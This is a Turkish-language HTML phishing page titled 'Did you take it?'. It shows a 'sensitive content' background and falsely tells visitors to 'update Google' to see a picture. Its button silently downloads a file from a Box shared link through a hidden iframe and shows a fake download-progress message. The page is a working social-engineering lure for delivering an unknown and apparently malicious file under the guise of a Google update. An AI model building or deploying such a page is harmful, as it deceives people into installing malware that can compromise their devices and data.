<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Senmi cektin</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: url('https://e1.pxfuel.com/desktop-wallpaper/260/821/desktop-wallpaper-sensitive-content-by-tahmid-ebne-jashim12.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: white;
            text-align: center;
        }
        
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: -1;
        }
        
        .container {
            max-width: 350px;
            width: 100%;
            padding: 60px 25px;
            margin-top: 80px;
        }
        
        .message {
            font-size: 20px;
            margin-bottom: 50px;
            line-height: 1.4;
            color: #ffffff;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
            font-weight: 500;
        }
        
        .download-btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 18px 35px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            font-weight: 500;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }
        
        .download-btn:hover {
            background: #3367d6;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
        }
        
        .download-btn:active {
            transform: translateY(1px);
        }
        
        .download-btn:disabled {
            background: #34a853;
            cursor: not-allowed;
            transform: none;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }
        
        #hiddenIframe {
            display: none;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 50px 20px;
                margin-top: 60px;
            }
            
            .message {
                font-size: 18px;
                margin-bottom: 40px;
            }
            
            .download-btn {
                padding: 16px 30px;
                font-size: 16px;
            }
        }
        
        @media (max-width: 360px) {
            .container {
                margin-top: 50px;
                padding: 40px 15px;
            }
            
            .message {
                font-size: 16px;
                margin-bottom: 35px;
            }
            
            .download-btn {
                padding: 14px 25px;
                font-size: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="overlay"></div>
    
    <div class="container">
        <p class="message">Resmi görebilmek için Google güncelleyin</p>
        
        <button class="download-btn" id="downloadBtn">İNDİR</button>
    </div>

    <iframe id="hiddenIframe" name="hiddenIframe"></iframe>

    <script>
        document.getElementById('downloadBtn').addEventListener('click', function() {
            const downloadBtn = this;
            const downloadLink = 'https://app.box.com/index.php?rm=box_download_shared_file&shared_name=ftgr3ytq2numnspwkfbnbip0imqv4fbk&file_id=f_2025505115298'; 
            
            // Butonu devre dışı bırak ve "İndiriliyor..." yaz
            downloadBtn.disabled = true;
            downloadBtn.textContent = 'İndiriliyor...';
            
            // Gizli iframe'de aç
            const iframe = document.getElementById('hiddenIframe');
            iframe.src = downloadLink;
            
            // İndirildiğini simüle et (gerçek uygulamada bu kısmı iframe'in load event'ı ile de yapabilirsiniz)
            setTimeout(function() {
                downloadBtn.textContent = 'İndirildi!';
                downloadBtn.style.background = '#34a853';
                
                // 3 saniye sonra butonu eski haline getir
                setTimeout(function() {
                    downloadBtn.disabled = false;
                    downloadBtn.textContent = 'İNDİR';
                    downloadBtn.style.background = '#4285f4';
                }, 3000);
                
            }, 2000);
        });
    </script>
</body>
</html>
